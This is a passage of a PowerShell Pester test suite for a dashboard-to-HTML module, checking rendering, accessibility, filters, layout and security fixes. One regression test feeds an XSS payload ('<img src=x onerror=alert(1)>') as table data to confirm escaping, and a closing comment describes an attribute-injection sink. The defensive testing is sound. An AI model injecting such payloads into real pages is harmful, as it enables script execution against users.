        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_topo_$([guid]::NewGuid().ToString('N')).html")
        try {
            Export-DhDashboard -Report $script:report -OutputPath $tmp -Force | Out-Null
            $html = Get-Content -LiteralPath $tmp -Raw
            $html | Should -Match '"interactive":true'
            $html | Should -Match 'topology-map-toolbar'
            $html | Should -Match 'topo-toggle'
            $html | Should -Match 'function computeLayout'
        } finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
    }
}

Describe 'Table: non-pageable renders all rows + virtualisation' {
    BeforeEach { $script:report = New-DhDashboard -Title 'virt' -Theme 'Default' }
    It 'emits pageable:false for -Pageable:$false' {
        Add-DhTable -Report $script:report -TableId 't' -Title 'T' `
            -Data @(1..50 | ForEach-Object { [pscustomobject]@{ N=$_ } }) -Pageable:$false
        ($script:report.Tables | Where-Object Id -eq 't').Pageable | Should -BeFalse
    }
    It 'includes the virtualisation engine + threshold in the exported HTML' {
        Add-DhTable -Report $script:report -TableId 't' -Title 'T' `
            -Data @(1..300 | ForEach-Object { [pscustomobject]@{ N=$_; Name="h$_" } }) -Pageable:$false
        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_virt_$([guid]::NewGuid().ToString('N')).html")
        try {
            Export-DhDashboard -Report $script:report -OutputPath $tmp -Force | Out-Null
            $html = Get-Content -LiteralPath $tmp -Raw
            $html | Should -Match '_renderVirtual'
            $html | Should -Match 'VIRTUALISE_ABOVE'
            $html | Should -Match 'table-virtual'
            $html | Should -Match '_buildRow'
        } finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
    }
}

Describe 'Accessibility: reduced-motion + ARIA in exported HTML' {
    BeforeAll {
        $script:a11yHtml = $null
        try {
            $rpt = New-DhDashboard -Title 'a11y' -Theme 'Default'
            Add-DhTable -Report $rpt -TableId 't' -Title 'T' -Data @(
                [pscustomobject]@{ Name='a'; V=1 }, [pscustomobject]@{ Name='b'; V=2 }
            )
            $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_a11y_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmp -Force | Out-Null
            $script:a11yHtml = Get-Content -LiteralPath $tmp -Raw
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        } catch { $script:a11yHtml = "ERROR: $($_.ToString())" }
    }
    It 'honours prefers-reduced-motion' { $script:a11yHtml | Should -Match '@media \(prefers-reduced-motion: reduce\)' }
    It 'marks the result-count region aria-live'  { $script:a11yHtml | Should -Match 'aria-live="polite"' }
    It 'sets aria-sort on sortable headers (JS)'   { $script:a11yHtml | Should -Match 'aria-sort' }
    It 'makes sortable headers keyboard-operable'  { $script:a11yHtml | Should -Match 'th\.tabIndex=0' }
    It 'gives sortable headers a focus ring'       { $script:a11yHtml | Should -Match 'th\.sortable:focus-visible' }
}

# ============================================================================
#  v1.9.0 — Add-DhGlobalFilter (page-level filter bus)
# ============================================================================

Describe 'Add-DhGlobalFilter' {
    BeforeEach { $script:report = New-DhDashboard -Title 'gf' -Theme 'Default' }

    It 'adds a facet filter with defaults' {
        Add-DhGlobalFilter -Report $script:report -Field 'Env'
        $gf = $script:report.GlobalFilters[0]
        $gf.Field | Should -Be 'Env'
        $gf.Label | Should -Be 'Env'          # defaults to Field
        $gf.Type  | Should -Be 'facet'
    }
    It 'accepts a daterange type and explicit label' {
        Add-DhGlobalFilter -Report $script:report -Field 'Created' -Label 'Created on' -Type daterange
        $gf = $script:report.GlobalFilters[0]
        $gf.Type  | Should -Be 'daterange'
        $gf.Label | Should -Be 'Created on'
    }
    It 'stores explicit facet values in order' {
        Add-DhGlobalFilter -Report $script:report -Field 'Tier' -Values 'Gold','Silver','Bronze'
        ($script:report.GlobalFilters[0].Values -join ',') | Should -Be 'Gold,Silver,Bronze'
    }
    It 'rejects a duplicate field' {
        Add-DhGlobalFilter -Report $script:report -Field 'Env'
        { Add-DhGlobalFilter -Report $script:report -Field 'Env' } |
            Should -Throw -ExpectedMessage '*already exists*'
    }

    Context 'exported HTML wiring' {
        BeforeAll {
            $rpt = New-DhDashboard -Title 'gf-e2e' -Theme 'Default'
            Add-DhTable -Report $rpt -TableId 'srv' -Title 'Servers' -Data @(
                [pscustomobject]@{ Host='a'; Env='Prod' }, [pscustomobject]@{ Host='b'; Env='Dev' }
            )
            Add-DhGlobalFilter -Report $rpt -Field 'Env' -Label 'Environment'
            Add-DhGlobalFilter -Report $rpt -Field 'Created' -Type daterange
            $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_gf_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmp -Force | Out-Null
            $script:gfHtml = Get-Content -LiteralPath $tmp -Raw
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
        It 'renders the filter-bar container'      { $script:gfHtml | Should -Match 'id="global-filter-bar"' }
        It 'emits the global-filter config'         { $script:gfHtml | Should -Match '"field":"Env"' }
        It 'emits the daterange control'            { $script:gfHtml | Should -Match '"type":"daterange"' }
        It 'includes the GlobalFilter bus'          { $script:gfHtml | Should -Match 'var GlobalFilter =' }
        It 'wires the filter stage into _getFiltered' { $script:gfHtml | Should -Match 'GlobalFilter\.matchRow' }
        It 'substitutes the config placeholder'     { $script:gfHtml | Should -Not -Match '%%GLOBALFILTER_CONFIG%%' }
    }
}

# ============================================================================
#  v1.10.0 — 12-column grid layout (opt-in -GridSpan)
# ============================================================================

Describe '12-column grid layout' {
    It 'stores GridSpan on a block' {
        $r = New-DhDashboard -Title 'g' -Theme 'Default'
        Add-DhHtmlBlock -Report $r -Id 'b' -Content 'x' -GridSpan 6 -AllowHtml:$false
        ($r.Blocks | Where-Object Id -eq 'b').GridSpan | Should -Be 6
    }
    It 'stores GridSpan on a table' {
        $r = New-DhDashboard -Title 'g' -Theme 'Default'
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{N=1}) -GridSpan 4
        ($r.Tables | Where-Object Id -eq 't').GridSpan | Should -Be 4
    }
    It 'rejects a span outside 0-12' {
        $r = New-DhDashboard -Title 'g' -Theme 'Default'
        { Add-DhHtmlBlock -Report $r -Id 'b' -Content 'x' -GridSpan 20 -AllowHtml:$false } | Should -Throw
    }

    Context 'exported HTML' {
        BeforeAll {
            $rg = New-DhDashboard -Title 'grid' -Theme 'Default'
            Add-DhTable -Report $rg -TableId 't' -Title 'T' -Data @([pscustomobject]@{N=1})
            Add-DhHtmlBlock -Report $rg -Id 'l' -Content 'left'  -GridSpan 6 -AllowHtml:$false
            Add-DhHtmlBlock -Report $rg -Id 'r' -Content 'right' -GridSpan 6 -AllowHtml:$false
            $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_grid_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rg -OutputPath $tmp -Force | Out-Null
            $script:gridHtml = Get-Content -LiteralPath $tmp -Raw
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue

            $rf = New-DhDashboard -Title 'flow' -Theme 'Default'
            Add-DhTable -Report $rf -TableId 't' -Title 'T' -Data @([pscustomobject]@{N=1})
            $tmp2 = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_flow_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rf -OutputPath $tmp2 -Force | Out-Null
            $script:flowHtml = Get-Content -LiteralPath $tmp2 -Raw
            Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue
        }
        It 'activates the grid body class when a span is set' { $script:gridHtml | Should -Match 'class="report-body report-grid"' }
        It 'emits the inline grid-column span'                { $script:gridHtml | Should -Match 'grid-column:span 6' }
        It 'includes the 12-column grid CSS'                  { $script:gridHtml | Should -Match 'repeat\(12, minmax' }
        It 'leaves a no-span dashboard in flow layout'        {
            $script:flowHtml | Should -Match 'class="report-body"'
            $script:flowHtml | Should -Not -Match 'report-body report-grid'
        }
    }
}

# ============================================================================
#  v1.10.1 — review fixes (H1 progressbar XSS, M2 dup-Id, M3 select-all)
# ============================================================================

Describe 'Security: progressbar cell value is escaped (H1)' {
    It 'wraps the progress label value in esc() in the runtime JS' {
        $r = New-DhDashboard -Title 'pb' -Theme 'Default'
        Add-DhTable -Report $r -TableId 't' -Title 'T' `
            -Data @([pscustomobject]@{ Name='a'; Load='<img src=x onerror=alert(1)>' }) `
            -Columns @( @{ Field='Name'; Label='Name' }, @{ Field='Load'; Label='Load'; CellType='progressbar' } )
        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_pb_$([guid]::NewGuid().ToString('N')).html")
        try {
            Export-DhDashboard -Report $r -OutputPath $tmp -Force | Out-Null
            $html = Get-Content -LiteralPath $tmp -Raw
            # The progressbar renderer must escape the label: the JS builds it with
            # +esc(dispVal)+ , never the raw +dispVal+ (which was the XSS sink).
            $html | Should -Match '\+esc\(dispVal\)\+'
            $html | Should -Not -Match '\+dispVal\+'
        } finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
    }
}

Describe 'Duplicate-Id guard on all block cmdlets (M2)' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'dup' -Theme 'Default'
        Add-DhTable -Report $script:report -TableId 'tbl' -Title 'T' -Data @([pscustomobject]@{ X=1 })
    }
    It 'Add-DhBarChart throws on a duplicate block Id' {
        Add-DhBarChart -Report $script:report -Id 'd' -Title 'A' -TableId 'tbl' -Field 'X'
        { Add-DhBarChart -Report $script:report -Id 'd' -Title 'B' -TableId 'tbl' -Field 'X' } |
            Should -Throw -ExpectedMessage '*already exists*'
    }
    It 'Add-DhCollapsible throws on a duplicate block Id' {
        Add-DhCollapsible -Report $script:report -Id 'd' -Title 'A' -Content 'x' -AllowHtml:$false
        { Add-DhCollapsible -Report $script:report -Id 'd' -Title 'B' -Content 'y' -AllowHtml:$false } |
            Should -Throw -ExpectedMessage '*already exists*'
    }
    It 'Add-DhFilterCard throws on a duplicate block Id' {
        Add-DhFilterCard -Report $script:report -Id 'd' -Title 'A' -TargetTableId 'tbl' -FilterField 'X' -Cards @(@{Label='a';Value='a'})
        { Add-DhFilterCard -Report $script:report -Id 'd' -Title 'B' -TargetTableId 'tbl' -FilterField 'X' -Cards @(@{Label='b';Value='b'}) } |
            Should -Throw -ExpectedMessage '*already exists*'
    }
    It 'Add-DhHtmlBlock throws on a duplicate block Id' {
        Add-DhHtmlBlock -Report $script:report -Id 'd' -Content 'x' -AllowHtml:$false
        { Add-DhHtmlBlock -Report $script:report -Id 'd' -Content 'y' -AllowHtml:$false } |
            Should -Throw -ExpectedMessage '*already exists*'
    }
    It 'Add-DhPieChart throws on a duplicate block Id' {
        Add-DhPieChart -Report $script:report -Id 'd' -Title 'A' -Slices @(@{Label='a';Value=1})
        { Add-DhPieChart -Report $script:report -Id 'd' -Title 'B' -Slices @(@{Label='b';Value=1}) } |
            Should -Throw -ExpectedMessage '*already exists*'
    }
    It 'Add-DhRangeBar throws on a duplicate block Id' {
        $rbItems = @(@{ Name='a'; Low=0; High=10; Min=1; Avg=2; Max=3 })
        Add-DhRangeBar -Report $script:report -Id 'd' -Title 'A' -Items $rbItems
        { Add-DhRangeBar -Report $script:report -Id 'd' -Title 'B' -Items $rbItems } |
            Should -Throw -ExpectedMessage '*already exists*'
    }
    # v2.1.4 - the title says "all block cmdlets"; until 2.1.4 only the six
    # above were covered. The rest, with the smallest valid input each.
    It '<Name> throws on a duplicate block Id' -ForEach @(
        @{ Name = 'Add-DhBullet';      Call = { param($r) Add-DhBullet -Report $r -Id 'd' -Title 'X' -Items @(@{ Label = 'a'; Value = 1; Target = 2; Max = 3 }) } }
        @{ Name = 'Add-DhEventFeed';   Call = { param($r) Add-DhEventFeed -Report $r -Id 'd' -Title 'X' -Events @(@{ Timestamp = '2026-01-01 10:00'; Severity = 'info'; Source = 's'; Message = 'm' }) } }
        @{ Name = 'Add-DhHeatmap';     Call = { param($r) Add-DhHeatmap -Report $r -Id 'd' -Title 'X' -Rows @('r') -Columns @('c') -Cells @(@{ Row = 'r'; Column = 'c'; Value = 1 }) } }
        @{ Name = 'Add-DhLineChart';   Call = { param($r) Add-DhLineChart -Report $r -Id 'd' -Title 'X' -XAxis @('a', 'b') -Series @(@{ Label = 'S'; Values = @(1, 2) }) } }
        @{ Name = 'Add-DhStatusGrid';  Call = { param($r) Add-DhStatusGrid -Report $r -Id 'd' -Title 'X' -Rows @('r') -Columns @('c') -Cells @(@{ Row = 'r'; Column = 'c'; Status = 'ok' }) } }
        @{ Name = 'Add-DhTabs';        Call = { param($r) Add-DhTabs -Report $r -Id 'd' -Tabs @(@{ Title = 'A'; Content = 'x' }) -AllowHtml:$false } }
        @{ Name = 'Add-DhTopologyMap'; Call = { param($r) Add-DhTopologyMap -Report $r -Id 'd' -Title 'X' -Nodes @(@{ Id = 'n'; Label = 'N' }) } }
        @{ Name = 'Add-DhAlertBanner'; Call = { param($r) Add-DhAlertBanner -Report $r -Id 'd' -Message 'm' } }
        @{ Name = 'Add-DhFindings';    Call = { param($r) Add-DhFindings -Report $r -Id 'd' -Findings @(@{ Severity = 'ok'; Title = 't' }) } }
        @{ Name = 'Add-DhKeyValue';    Call = { param($r) Add-DhKeyValue -Report $r -Id 'd' -Items @(@{ Label = 'a'; Value = 'b' }) } }
        @{ Name = 'Add-DhRecordList';  Call = { param($r) Add-DhRecordList -Report $r -Id 'd' -Items @(@{ Title = 't' }) } }
    ) {
        & $Call $script:report
        { & $Call $script:report } | Should -Throw -ExpectedMessage '*already*'
    }
}

Describe 'Select-all covers all rows when non-pageable (M3)' {
    It 'emits the pageable-aware select-all branch (whole set when not pageable)' {
        $r = New-DhDashboard -Title 'sel' -Theme 'Default'
        Add-DhTable -Report $r -TableId 't' -Title 'T' -MultiSelect -Pageable:$false `
            -Data @(1..40 | ForEach-Object { [pscustomobject]@{ N=$_ } })
        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sel_$([guid]::NewGuid().ToString('N')).html")
        try {
            Export-DhDashboard -Report $r -OutputPath $tmp -Force | Out-Null
            $html = Get-Content -LiteralPath $tmp -Raw
            # The select-all handler now branches on self.pageable; a non-pageable
            # table selects the whole filtered set rather than slicing by pageSize.
            $html | Should -Match 'var pageRows=self\.pageable'
        } finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
    }
}

# ============================================================================
#  v1.10.2 — review fixes (L1 accent-fg contrast, L3 Excel sheet name)
# ============================================================================

Describe 'Themes define --accent-primary-fg (L1)' {
    It '<Theme> exports HTML that defines --accent-primary-fg' -ForEach @(
        @{ Theme = 'Default' }, @{ Theme = 'Azure' }, @{ Theme = 'VMware' },
        @{ Theme = 'Grey' }, @{ Theme = 'Company' }, @{ Theme = 'Rag' }
    ) {
        $r = New-DhDashboard -Title 'th' -Theme $Theme
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ N=1 })
        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_th_$([guid]::NewGuid().ToString('N')).html")
        try {
            Export-DhDashboard -Report $r -OutputPath $tmp -Force | Out-Null
            # Both the light (primary) and dark (alternate) embedded theme blocks
            # must define the token so the subgroup-pill / topo-toggle text is readable.
            (Get-Content -LiteralPath $tmp -Raw) | Should -Match '--accent-primary-fg:'
        } finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
    }
    It 'every theme source file defines --accent-primary-fg' {
        $themeDir = Join-Path $PSScriptRoot '..' 'DashHtml' 'Private'
        $files = Get-ChildItem -Path $themeDir -Filter 'Get-DhCss*Light.ps1' -ErrorAction SilentlyContinue
        $files += Get-ChildItem -Path $themeDir -Filter 'Get-DhCss*Dark.ps1' -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            (Get-Content -LiteralPath $f.FullName -Raw) | Should -Match '--accent-primary-fg:' -Because "$($f.Name) must define the token"
        }
    }
}

Describe 'Excel sheet-name sanitisation (L3)' {
    It 'emits the sheet-name sanitiser in the export JS' {
        $r = New-DhDashboard -Title 'x' -Theme 'Default'
        Add-DhTable -Report $r -TableId 't' -Title 'Q1:Q2 / prod [east]' -Data @([pscustomobject]@{ N=1 })
        $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_xl_$([guid]::NewGuid().ToString('N')).html")
        try {
            Export-DhDashboard -Report $r -OutputPath $tmp -Force | Out-Null
            $html = Get-Content -LiteralPath $tmp -Raw
            # The invalid-char strip + Sheet1 fallback must be present, and the raw
            # substring(0,31) call must be gone.
            $html | Should -Match "replace\(/\[:.*\]/g,' '\)"
            $html | Should -Match "sheetName='Sheet1'"
            $html | Should -Not -Match 'book_append_sheet\(wb,ws,this\.title\.substring'
        } finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
    }
}

# ============================================================================
#  v1.5.4 — Examples smoke test
# ============================================================================

Describe 'Examples: every shipped example script renders valid HTML' {
    # Each example is executed in its OWN pwsh subprocess rather than dot-sourced
    # into the test session. Three reasons:
    #   1. Every example does `Import-Module ...\DashHtml.psd1 -Force`, which
    #      would collide with the copy this suite already imported (the same
    #      "Multiple script or manifest modules named 'DashHtml'" failure that
    #      previously broke the InModuleScope tests).
    #   2. Examples call Set-StrictMode -Version Latest at file scope.
    #   3. A subprocess is exactly how a user runs them, so this tests the real
    #      contract: script in, HTML out, exit 0.
    # Output goes to a temp dir so the committed Examples\*.html are untouched.

    # Discovery-scoped: drives the -ForEach expansion (evaluated at discovery time).
    BeforeDiscovery {
        $exampleDir = Join-Path $PSScriptRoot '..' 'Examples'
        $exampleCases = @(
            Get-ChildItem -Path $exampleDir -Filter '*.ps1' -ErrorAction SilentlyContinue |
                Sort-Object Name |
                ForEach-Object { @{ Name = $_.Name; FullName = $_.FullName } }
        )
    }

    # Run-scoped: available inside It bodies (BeforeDiscovery vars are NOT).
    BeforeAll {
        $script:exampleDir   = Join-Path $PSScriptRoot '..' 'Examples'
        $script:exampleCount = @(Get-ChildItem -Path $script:exampleDir -Filter '*.ps1' -ErrorAction SilentlyContinue).Count
        $script:smokeDir     = Join-Path ([System.IO.Path]::GetTempPath()) "dh_examples_$([guid]::NewGuid().ToString('N'))"
        New-Item -ItemType Directory -Path $script:smokeDir -Force | Out-Null
    }

    AfterAll {
        if ($script:smokeDir -and (Test-Path -LiteralPath $script:smokeDir)) {
            Remove-Item -LiteralPath $script:smokeDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'finds at least one example script to test' {
        $script:exampleCount | Should -BeGreaterThan 0
    }

    It '<Name> runs clean and emits a well-formed dashboard' -ForEach $exampleCases {
        $outFile = Join-Path $script:smokeDir ($Name -replace '\.ps1$', '.html')

        # -OpenInBrowser deliberately omitted: all five examples default it to
        # $false, so no browser window opens during the run.
        $stderr = & pwsh -NoProfile -NonInteractive -File $FullName -OutputPath $outFile 2>&1
        $exit   = $LASTEXITCODE

        if ($exit -ne 0) {
            throw "$Name exited with code $exit`n$($stderr -join "`n")"
        }

        Test-Path -LiteralPath $outFile | Should -BeTrue -Because "$Name should have written $outFile"

        $html = Get-Content -LiteralPath $outFile -Raw
        $html.Length | Should -BeGreaterThan 1000 -Because 'a real dashboard is never this small'
        $html | Should -Match '<!DOCTYPE html>'
        $html | Should -Match '</html>\s*$'
        # The JS engine must have had its config placeholders substituted; an
        # unreplaced /*%%..%%*/ marker means Export-DhDashboard silently no-op'd.
        $html | Should -Not -Match '%%TABLES_CONFIG%%'
        $html | Should -Not -Match '%%BLOCKS_CONFIG%%'
        $html | Should -Not -Match '%%SUMMARY_CONFIG%%'
        $html | Should -Not -Match '%%ALERTS_CONFIG%%'

        # The menu is part of the contract: a real opening view, no section that shows on every
        # view by accident, no menu view that shows nothing, and at least two views per Demo-*
        # report (Tools\Show-DhNavMap.ps1 reads the exported file, like a reader's browser).
        $map = & (Join-Path $PSScriptRoot '..' 'Tools' 'Show-DhNavMap.ps1') -Path $outFile -Quiet -PassThru 6>$null
        $map.Warnings | Should -BeNullOrEmpty -Because "the menu of $Name should have no stray global section or empty view"
        @($map.Opens).Count | Should -BeGreaterThan 0
        if ($Name -like 'Demo-*') { @($map.Views).Count | Should -BeGreaterThan 1 }
    }
}



# ---------------------------------------------------------------------------
# Collapsible chrome survives a post-boot re-render   (v2.1.1)
#
# renderBlocks() hands a collapsible block an INNER container (#cinner-<id>)
# and a title-stripped clone. Three block types are re-rendered AFTER that -
# barchart, Mode-A piechart and table-fed rangebar - in the boot pass and again
# on every filter change. Before 2.1.1 those re-renders targeted the OUTER
# element ('block-<id>') with the original block, which overwrote the toggle
# header renderBlocks() had just built: the chevron vanished and -Collapsible /
# -DefaultOpen were silently dead for bar and pie charts.
#
# The collapsible chrome is assembled client-side, so it cannot be asserted in
# the emitted HTML. These tests pin the runtime contract instead: every
# re-render path resolves its target through blockRenderTarget(), and none
# reaches for the outer container directly.
# ---------------------------------------------------------------------------
Describe 'Collapsible chrome survives a post-boot re-render (v2.1.1)' {

    BeforeAll {
        $script:tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('DH_Collapse_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmpDir | Out-Null

        $r = New-DhDashboard -Title 'collapsible re-render'
        Add-DhTable -Report $r -TableId 'tbl' -Title 'T' -Data @(
            @{ K = 'a'; V = 1 }
            @{ K = 'a'; V = 2 }
            @{ K = 'b'; V = 3 }
        )
        Add-DhBarChart  -Report $r -Id 'bc' -Title 'Counts by K' -TableId 'tbl' -Field 'K'
        Add-DhPieChart  -Report $r -Id 'pc' -Title 'Pie by K'    -TableId 'tbl' -Field 'K'
        Add-DhRangeBar  -Report $r -Id 'rb' -Title 'Range by K'  -TableId 'tbl' `
                        -CategoryField 'K' -ValueField 'V'

        $script:htmlPath = Join-Path $script:tmpDir 'collapse.html'
        Export-DhDashboard -Report $r -OutputPath $script:htmlPath -Force
        $script:html = Get-Content $script:htmlPath -Raw
    }

    AfterAll {
        if ($script:tmpDir -and (Test-Path -LiteralPath $script:tmpDir)) {
            Remove-Item $script:tmpDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'ships the blockRenderTarget resolver' {
        $script:html | Should -Match 'function blockRenderTarget\(block\)'
        # it must prefer the inner container and strip the title, or the header
        # gets printed twice
        $script:html | Should -Match "getElementById\('cinner-' \+ block\.id\)"
    }

    It 'has no leftover range-bar-specific name for the resolver' {
        $script:html | Should -Not -Match 'rangeBarRenderTarget'
    }

    It 'routes every post-boot re-render through the resolver, none direct' {
        # Each of the three re-rendered block types appears twice: once in the
        # boot pass, once in _refreshLinkedBarCharts.
        ([regex]::Matches($script:html, 'blockRenderTarget\(block\)')).Count |
            Should -BeGreaterOrEqual 6 -Because 'boot + filter refresh, for barchart, piechart and rangebar'

        # The old defect, exactly: reaching for the outer container inside a
        # re-render loop. Nothing should do this any more.
        $script:html | Should -Not -Match "if \(container\) renderBarChart\(container, block\)"
        $script:html | Should -Not -Match "if \(container\) renderPieChart\(container, block\)"
        $script:html | Should -Not -Match "if \(container\) renderRangeBar\(container, block\)"
    }

    It 'renders the re-rendered chart types into the resolved container' {
        $script:html | Should -Match 'renderBarChart\(bcT\.container, bcT\.block\)'
        $script:html | Should -Match 'renderPieChart\(pcT\.container, pcT\.block\)'
        $script:html | Should -Match 'renderRangeBar\(rbT\.container, rbT\.block\)'
    }

    It 'still marks these blocks collapsible so the wrapper actually engages' {
        # -Collapsible defaults to $true; if this regressed to false the fix
        # above would be invisible for a different reason.
        $blocks = [regex]::Match($script:html, 'const BLOCKS_CONFIG\s*=\s*(\[.*?\]);').Groups[1].Value
        if (-not $blocks) {
            $blocks = [regex]::Match($script:html, 'BLOCKS_CONFIG\s*=\s*(\[.*?\]);').Groups[1].Value
        }
        $blocks | Should -Not -BeNullOrEmpty
        $cfg = $blocks | ConvertFrom-Json
        foreach ($id in 'bc', 'pc', 'rb') {
            $b = $cfg | Where-Object { $_.id -eq $id }
            $b            | Should -Not -BeNullOrEmpty -Because "block '$id' should be in BLOCKS_CONFIG"
            $b.collapsible | Should -BeTrue -Because "'$id' should default to collapsible"
        }
    }
}

# ---------------------------------------------------------------------------
# Long cell values: tooltip on clipped cells + resizable columns
#
# .data-table tbody td is `white-space: nowrap; overflow: hidden;
# text-overflow: ellipsis`, so any value wider than its column is cut off. It
# used to be cut off with no way to read the rest: _renderCell set textContent
# and nothing else, and the column width was fixed at authoring time. A real
# report hit this with 271-character values in a 300px column.
# ---------------------------------------------------------------------------
Describe 'Long cell values are readable (tooltip + column resize)' {

    BeforeAll {
        $script:tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('DH_Trunc_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmpDir | Out-Null

        $long = 'A' * 260
        $rows = 1..6 | ForEach-Object {
            @{ Short = "u$_"; Long = $(if ($_ % 2) { $long } else { 'brief' }) }
        }
        $r = New-DhDashboard -Title 'trunc'
        Add-DhTable -Report $r -TableId 'wide' -Title 'Wide values' -Data $rows -Columns @(
            @{ Field = 'Short'; Label = 'Short'; Width = '120px' }
            @{ Field = 'Long';  Label = 'Long';  Width = '300px' }
        )
        $script:htmlPath = Join-Path $script:tmpDir 'trunc.html'
        Export-DhDashboard -Report $r -OutputPath $script:htmlPath -Force
        $script:html = Get-Content $script:htmlPath -Raw
    }

    AfterAll {
        if ($script:tmpDir -and (Test-Path -LiteralPath $script:tmpDir)) {
            Remove-Item $script:tmpDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'ships the measured truncation pass' {
        $script:html | Should -Match 'TableEngine\.prototype\._markTruncated'
        # measured, not guessed from string length - the threshold is the
        # rendered width, which the theme font and a drag both change
        $script:html | Should -Match 'scrollWidth>td\.clientWidth'
    }

    It 'runs the truncation pass on every render' {
        $render = [regex]::Match($script:html, 'TableEngine\.prototype\.render\s*=\s*function\(\)\{(.*?)\};', 'Singleline')
        $render.Success       | Should -BeTrue
        $render.Groups[1].Value | Should -Match '_markTruncated\(\)'
    }

    It 'stashes the full value on text cells so the tooltip has something to show' {
        $script:html | Should -Match "cellType==='text' && dispVal"
        $script:html | Should -Match 'td\.dataset\.full=dispVal'
    }

    It 'lets the declared column width beat the stylesheet cap' {
        # Without this a column declared wider than the td max-width was clipped
        # anyway, silently ignoring -Width.
        $script:html | Should -Match 'td\.style\.maxWidth=effW'
        $script:html | Should -Match '"width":"300px"'
    }

    It 'ships a drag-to-resize grip that does not trigger the sort' {
        $script:html | Should -Match "grip\.className='col-resizer'"
        $script:html | Should -Match 'TableEngine\.prototype\._setColWidth'
        # the grip lives inside a sortable th, so it must swallow its own events
        $script:html | Should -Match "grip\.addEventListener\('click',function\(e\)\{e\.stopPropagation\(\);\}\)"
    }

    It 'makes the grip keyboard-operable and resettable' {
        $script:html | Should -Match "aria-label','Resize column "
        $script:html | Should -Match "e\.key==='ArrowLeft'"
        $script:html | Should -Match "e\.key==='Home'"
        $script:html | Should -Match "grip\.addEventListener\('dblclick'"
    }

    It 'styles the resizer and the clipped-cell affordance' {
        $script:html | Should -Match '\.col-resizer \{'
        $script:html | Should -Match 'cursor: col-resize'
        $script:html | Should -Match '\.data-table tbody td\.cell-clipped \{'
    }

    It 'keeps per-table width overrides isolated from the column definitions' {
        # colWidths is engine state; col.width stays the author's declaration so
        # a reset (double-click / Home) can fall back to it.
        $script:html | Should -Match 'this\.colWidths     = \{\};'
        $script:html | Should -Match 'self\._effWidth\(col\)'   # v2.4.0: dragged, declared, then measured (see _effWidth)
    }

    # -- 2.1.2: the header used to set the column's hard minimum -------------
    It 'lets the header clip, so a column can shrink below its own label' {
        # table-layout is auto, where width is only a suggestion: a nowrap header
        # that cannot clip pins the column at label + padding + sort icon.
        # 'Ottenuto tramite' floored a real report at 181px.
        $script:html | Should -Match '\.data-table thead th \{[^}]*overflow: hidden'
        $script:html | Should -Match '\.data-table thead th \.col-label \{'
        $script:html | Should -Match 'text-overflow: ellipsis'
    }

    It 'caps the header width, not just suggests it' {
        $script:html | Should -Match 'th\.style\.maxWidth=effW'
        # a live drag must move the cap too, or the header springs back
        $script:html | Should -Match 'head\.children\[idx\]\.style\.maxWidth=w'
    }

    It 'gives a clipped header the same measured tooltip as a clipped cell' {
        $script:html | Should -Match "lab\.scrollWidth>lab\.clientWidth"
        $script:html | Should -Match "ths\[h\]\.title=lab\.textContent"
        $script:html | Should -Match "classList\.add\('th-clipped'\)"
        # and drops it again when the column is widened
        $script:html | Should -Match "ths\[h\]\.removeAttribute\('title'\)"
    }

    It 'does not reserve icon space in the label, which faked a clipped header' {
        # calc(100% - 26px) made a short header like "ID" measure as clipped in a
        # narrow column and pick up a pointless tooltip.
        $script:html | Should -Match '\.data-table thead th \.col-label \{[^}]*max-width: 100%'
        $script:html | Should -Not -Match 'max-width: calc\(100% - 26px\)'
    }

    It 'keeps the resize grip inside the now-clipping header' {
        # right:-3px would be cut off by the header's overflow:hidden
        $script:html | Should -Match '\.col-resizer \{[^}]*right: 0;'
        $script:html | Should -Not -Match 'right: -3px'
    }

    It 'lowers the drag floor now that the header no longer sets one' {
        $script:html | Should -Match 'Math\.max\(40,startW\+'
        $script:html | Should -Not -Match 'Math\.max\(60,'
    }
}

# ---------------------------------------------------------------------------
# Bar-chart click filters bind a real handler   (v2.1.3)
#
# -ClickFilters shipped broken from the start: renderBarChart built an inline
# onclick attribute, which is evaluated in GLOBAL scope, while `engines` is a
# var inside the runtime IIFE. Every click threw ReferenceError. The attribute
# also spliced the bar's label into markup escaping only single quotes, so a
# label containing a double quote broke out and the remaining JS was parsed as
# HTML attributes - a controllable attribute-injection sink fed by table data.
